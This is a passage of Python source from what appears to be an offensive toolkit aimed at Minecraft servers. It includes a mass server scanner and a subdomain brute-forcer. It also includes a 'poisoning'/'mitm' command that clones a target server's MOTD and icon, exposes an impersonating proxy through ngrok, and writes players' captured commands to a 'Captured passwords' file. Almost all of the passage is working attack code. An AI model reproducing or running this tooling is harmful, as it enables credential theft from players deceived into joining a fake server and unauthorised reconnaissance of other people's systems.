                                results_file = open(f"results/qubo/Qubo_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt", "w", encoding="utf8")
                                results_file.write("Qubo scan \n\n")
                                results_file.write("Information:\n\n")
                                results_file.write(f"    Date: {str(date.year)}-{str(date.month)}-{str(date.day)}\n")
                                results_file.write(f"    Hour: {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n")
                                results_file.write(f"    Target: {str(ip)}\n")
                                results_file.write(f"    Ports: {str(ports)}\n")
                                results_file.write(f"    Threads: {str(threads)}\n")
                                results_file.write(f"    Timeout: {str(timeout)}\n")

                                with open(f"config/qubo/outputs/{qubo_file}", encoding="utf8") as qubo_result:
                                    for line in qubo_result:
                                        qubo_ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}", line)
                                        qubo_ip = " ".join(qubo_ip)
                                        if ":" in qubo_ip:
                                            qubo_ips.append(f"{qubo_ip}")

                                if len(qubo_ips) == 0:
                                    results_file.close()
                                    print(f"\n{white}     The scan ended and found {lred}0 {white}servers.")

                                else:
                                    for i in qubo_ips:
                                        i = i.split(":")
                                        try:
                                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                            s.settimeout(2)
                                            s.connect((i[0], int(i[1])))
                                            s.send(b"\xfe\x01")
                                            data = s.recv(1024)[3:].decode("utf-16be")[3:].split("\x00")
                                            s.close()

                                            version = re.sub(r"§[a-zA-Z0-9]", "", data[1].strip().replace("  ", "").replace("  ", ""))
                                            motd = re.sub(r"§[a-zA-Z0-9]", "", data[2].strip().replace("  ", "").replace("  ", ""))
                                            motd = motd.replace("\n", "")
                                            players = re.sub(r"§[a-zA-Z0-9]", "", f"{data[3]}/{data[4]}".strip().replace("  ", "").replace("  ", ""))
                                            numservers += 1

                                            print(f"\n{white}     [{lgreen}√{white}] {green}Server found:")
                                            print(f"\n{white}        IP: {lcyan}{str(i[0])}:{str(i[1])}")
                                            print(f"        {white}MOTD: {lcyan}{str(motd)}")
                                            print(f"        {white}Version: {lcyan}{str(version)}")
                                            print(f"        {white}Players: {lcyan}{str(players)}\n")

                                            results_file.write("\n[+] Server found: \n\n")
                                            results_file.write(f"    IP: {str(i[0])}:{str(i[1])}\n")
                                            results_file.write(f"    MOTD: {str(motd)}\n")
                                            results_file.write(f"    Version: {str(version)}\n")
                                            results_file.write(f"    Players: {str(players)}\n")

                                        except socket.timeout:
                                            print(f"\n{white}     [{lred}-{white}] {green}Server found: {red}(time out){green}: ")
                                            print(f"\n        {white}IP: {lcyan}{str(i[0])}:{str(i[1])}")
                                            results_file.write(f"\n[-] Server found (Offline)     IP: {str(i[0])}:{str(i[1])}\n")

                                        except Exception as e:
                                            if DEBUG:
                                                print(f"     [DEBUG] Exception #5 (qubo): {e}")

                                            pass

                                    if numservers == 1:
                                        print(f"{white}     The scan ended and found {green}{str(numservers)} {white}server.")

                                    elif numservers == 0:
                                        print(f"{white}     The scan ended and found {lred}{str(numservers)} {white}servers.")
                                        results_file.write("No servers found")

                                    else:
                                        print(f"{white}     The scan ended and found {green}{str(numservers)} {white}servers.")

                                    os.remove(f"config/qubo/outputs/{qubo_file}")
                                    results_file.close()
                                    print(f"\n     All scan data was saved in results/qubo/Qubo_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt {reset}")

                            except KeyboardInterrupt:
                                os.remove(f"config/qubo/outputs/{qubo_file}")
                                results_file.close()
                                print("")
                                continue

                            except Exception as e:
                                if DEBUG:
                                    print(f"     [DEBUG] Exception #4 (qubo): {e}")

                                print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid IP")

                        except KeyboardInterrupt:
                            print("")
                            continue

                        except Exception as e:
                            if DEBUG:
                                print(f"     [DEBUG] Exception #3 (qubo): {e}")

                    except KeyboardInterrupt:
                        print("")
                        continue

                    except Exception as e:
                        if DEBUG:
                            print(f"     [DEBUG] Exception #2 (qubo): {e}")

                        if qubo_error == "threads":
                            print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid threads value")

                        elif qubo_error == "timeout":
                            print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid timeout value")

                except KeyboardInterrupt:
                    print("")
                    continue

                except Exception as e:
                    if DEBUG:
                        print(f"     [DEBUG] Exception #1 (qubo): {e}")

                    print(f"{white}\n     Usage: qubo [ip] [ports] [th] [ti] ")

            elif command.lower() == "subd":
                try:
                    domain = argument[1]
                    subdomains_file = argument[2].lower()
                    number_of_lines = 0
                    num_subd = 0

                    try:
                        location = f"config/subdomains/{str(subdomains_file)}"

                        with open(location) as file:
                            for _ in file:
                                number_of_lines += 1

                        try:
                            check_connection()
                            try:
                                socket.gethostbyname(f"{str(domain)}")
                                try:

                                    print(f"\n     {white}[{lgreen}+{white}] Scanning the domain {green}{str(domain)}\n")
                                    print(f"     {white}File: {str(subdomains_file)} ({str(number_of_lines)} subdomains)")

                                    date = datetime.now()
                                    check_folder("results")
                                    check_folder("results/subdomains")

                                    results_file = open(f"results/subdomains/Subdomain_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt", "w", encoding="utf8")
                                    print("")

                                    results_file.write("Subdomains Scan \n\n")
                                    results_file.write("Information:\n\n")
                                    results_file.write(f"    Date: {str(date.year)}-{str(date.month)}-{str(date.day)}\n")
                                    results_file.write(f"    Hour: {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n")
                                    results_file.write(f"    Domain: {str(domain)}\n\n")

                                    results_file.write(f"Subdomains found: \n\n")

                                    with open(location) as subdomain_list:
                                        for line in subdomain_list:
                                            line_subdomains = line.split("\n")

                                            try:
                                                subdomain = f"{str(line_subdomains[0])}.{str(domain)}"
                                                ip_subdomain = socket.gethostbyname(str(subdomain))

                                                num_subd += 1
                                                print(f"     {white}[{lgreen}√{white}] Subdomain found {lblack}» {green}{str(subdomain)} {lgreen}{str(ip_subdomain)}")
                                                results_file.write(f"{str(subdomain)} {str(ip_subdomain)}\n")

                                            except Exception as e:
                                                if DEBUG:
                                                    print(f"     [DEBUG] Exception #5 (subd): {e}")

                                                pass

                                    print("")

                                    if num_subd == 1:
                                        print(f"{white}     The scan ended and found {green}{str(num_subd)} {white}subdomain.")

                                    elif num_subd == 0:
                                        print(f"{white}     The scan ended and found {lred}{str(num_subd)} {white}subdomains.")

                                    else:
                                        print(f"{white}     The scan ended and found {green}{str(num_subd)} {white}subdomains.")

                                    print(f"\n     All scan data was saved in results/subdomains/Subdomain_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt {reset}")

                                    results_file.close()

                                except:
                                    pass

                            except Exception as e:
                                if DEBUG:
                                    print(f"     [DEBUG] Exception #4 (subd): {e}")

                                print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid Domain")

                        except KeyboardInterrupt:
                            print("")
                            continue

                        except Exception as e:
                            if DEBUG:
                                print(f"     [DEBUG] Exception #3 (subd): {e}")

                            print(f"\n     {white}[{red}-{white}] {lred}Connection error.")

                    except KeyboardInterrupt:
                        print("")
                        continue

                    except Exception as e:
                        if DEBUG:
                            print(f"     [DEBUG] Exception #2 (subd): {e}")

                        print(f"\n     {white}[{lred}Invalid arguments{white}] {white}The file ({str(subdomains_file)}) was not found")

                except KeyboardInterrupt:
                    print("")
                    continue

                except Exception as e:
                    if DEBUG:
                        print(f"     [DEBUG] Exception #1 (subd): {e}")

                    print(f"{white}\n     Usage: subd [domain] [file]")

            elif command.lower() == "bungee":
                try:
                    ip = argument[1]

                    cmd = "cd config/bungee && java -Xms512M -Xmx512M -jar WaterFall.jar >nul 2>&1"

                    try:
                        check_java()

                        try:
                            clear()
                            print(banner)
                            print(f"\n     {lblack}[{green}+{lblack}] {white}Starting proxy..")

                            config_file = open("config/files/config_bungee.txt", "r")
                            yml_config = config_file.read()
                            config_file.close()

                            config_file = open("config/bungee/config.yml", "w+")
                            config_file.truncate(0)
                            config_file.write(yml_config)
                            config_file.write(f"\n    address: {str(ip)}\n")
                            config_file.write(f"    restricted: false")
                            config_file.close()
                            bungee = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
                            time.sleep(1)

                            print(f"\n     {white}[{green}+{white}] IP: {lgreen}0.0.0.0:25567")
                            print(f"\n     {white}[{green}#{white}]{white} Commands: {lyellow}\n\n     connect <ip>")
                            print(f"\n     {white}Press {lred}ctrl c{white} to stop the bungeecord")

                            while True:
                                pass

                            bungee.kill()

                        except Exception as e:
                            if DEBUG:
                                print(f"     [DEBUG] Exception #3 (bungee): {e}")

                            print(f"\n     {white}[{red}ERROR{white}] {lred}Unknown error")

                    except Exception as e:
                        if DEBUG:
                            print(f"     [DEBUG] Exception #2 (bungee): {e}")

                        print(f"\n     {white}[{red}-{white}] {lred}You don't have java installed.")

                except Exception as e:
                    if DEBUG:
                        print(f"     [DEBUG] Exception #1 (bungee): {e}")

                    print(f"{white}\n     Usage: bungee [ip:port]")

            elif command.lower() == "poisoning" or command.lower() == "mitm":
                try:
                    server = argument[1].lower()

                    file = "config/poisoning/plugins/RPoisoner/commands.txt"
                    cmd = "cd config/poisoning && java -Xms512M -Xmx512M -jar WaterFall.jar >nul 2>&1"

                    try:
                        check_ngrok()
                        try:
                            check_connection()
                            try:
                                requests.get(urlmcsrv + server)
                                try:
                                    check_folder("results")
                                    check_folder("results/poisoning")

                                    r = requests.get(urlmcsrv + server)
                                    r_json = r.json()
                                    clean = r_json["motd"]["raw"]

                                    try:
                                        icon = r_json["icon"]
                                        data = icon.replace("data:image/png;base64,", "")
                                        image = base64.b64decode(data)

                                        with open(f"config/poisoning/server-icon.png", "wb") as f:
                                            f.write(image)

                                    except:
                                        shutil.copy("config/files/default-icon.png", "config/poisoning/server-icon.png")

                                    try:
                                        clean[0]
                                        clean[1]
                                        n = 1

                                    except:
                                        n = 0

                                    config_file = open("config/files/config_poisoning.txt", "r+")
                                    yml_config = config_file.read()
                                    config_file.close()

                                    config_file = open("config/poisoning/config.yml", "w+", encoding="utf8")
                                    config_file.truncate(0)
                                    config_file.write(yml_config)
                                    config_file.write(f"\n    address: {str(server)}\n")
                                    config_file.write(f"    restricted: false")
                                    config_file.close()

                                    motd_file = open("config/files/config_motd.txt", "r+")
                                    yml_config = motd_file.read()
                                    motd_file.close()

                                    motd_file = open("config/poisoning/plugins/CleanMOTD/config.yml", "w+", encoding="utf8")
                                    motd_file.truncate(0)
                                    motd_file.write(yml_config)

                                    if n == 1:
                                        motd_file.write(f"        {clean[0]}")
                                        motd_file.write(f"        {clean[1]}")

                                    else:
                                        motd_file.write(f'        {clean[0]}')

                                    motd_file.close()

                                    date = datetime.now()
                                    results_file = open(f"results/poisoning/poisoning_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt", "w", encoding="utf8")

                                    results_file.write("poisoning results \n\n")
                                    results_file.write("Information:\n\n")
                                    results_file.write(f"    Date: {str(date.year)}-{str(date.month)}-{str(date.day)}\n")
                                    results_file.write(f"    Hour: {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n")
                                    results_file.write(f"    Server: {str(server)}\n\n")

                                    results_file.write(f"Captured passwords: \n\n")

                                    clear()
                                    check_folder("config/poisoning/plugins/RPoisoner")
                                    check_file(file)

                                    print(banner)
                                    print(f"\n     {lblack}[{green}+{lblack}] {white}Starting proxy..")
                                    time.sleep(1)
                                    proxy = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
                                    print(f"\n     {lblack}[{green}+{lblack}] {white}Starting ngrok..")
                                    ngrok = subprocess.Popen(ngrok_command, stdout=subprocess.PIPE, shell=True)
                                    time.sleep(2)

                                    r = requests.get(urlngrok)
                                    r_unicode = r.content.decode("utf-8")
                                    r_json = json.loads(r_unicode)
                                    link = r_json["tunnels"][0]["public_url"]
                                    ipngrok = link.replace("tcp://", "")
                                    ipngrok = ipngrok.split(":")
                                    ipngrok2 = socket.gethostbyname(str(ipngrok[0]))
                                    ip_poisoning = ipngrok2 + ":" + ipngrok[1]

                                    print(f"\n     {lblack}[{green}IP{lblack}] {white}{str(ip_poisoning)}")
                                    print(f"\n     {lblack}[{green}IP{lblack}] {white}127.0.0.1:25568")
                                    print(f"\n     {lblack}[{white}#{lblack}] {white}Waiting for commands..\n")

                                    old_content = " "
                                    results_file.close()
                                    while True:
                                        time.sleep(1)
                                        commands_file = open(file, "r", encoding="unicode_escape")
                                        content = commands_file.readlines()

                                        if content == old_content:
                                            continue

                                        old_content = content

                                        for line in content:
                                            print(f"     {lblack}[{lgreen}!{lblack}] {white}Command captured {line}")
                                            with open(f"results/poisoning/poisoning_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt", "a") as f:
                                                f.write(f"Player {line}")

                                    proxy.kill()
                                    ngrok.kill()

                                except Exception as e:
                                    if DEBUG:
                                        print(f"     [DEBUG] Exception #7 (poisoning): {e}")

                                    print(f"\n     {lred}Unknown error")

                            except Exception as e:
                                if DEBUG:
                                    print(f"     [DEBUG] Exception #6 (poisoning): {e}")

                                print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid server")

                        except Exception as e:
                            if DEBUG:
                                print(f"     [DEBUG] Exception #5 (poisoning): {e}")

                            print(f"\n     {white}[{red}-{white}] {lred}Connection error.")

                    except Exception as e:
                        if DEBUG:
                            print(f"     [DEBUG] Exception #3 (poisoning): {e}")

                        if os.name == "nt":
                            print(f"\n     {white}[{red}-{white}] {lred}The file ngrok.exe could not be found")

                        else:
                            print(f"\n     {white}[{red}-{white}] {lred}The file ngrok could not be found")

                except Exception as e:
                    if DEBUG:
                        print(f"     [DEBUG] Exception #1 (poisoning): {e}")

                    print(f"{white}\n     Usage: poisoning [server]")

            elif command.lower() == "discord":
                print(f"\n     My Discord server: {green}{str(discord)}")

            else:
                print(f"\n     {lblack}[{red}-{lblack}] {lred}Unknown command. Type help to see the available commands.")

        except:
            pass


if __name__ == "__main__":
    check_os()
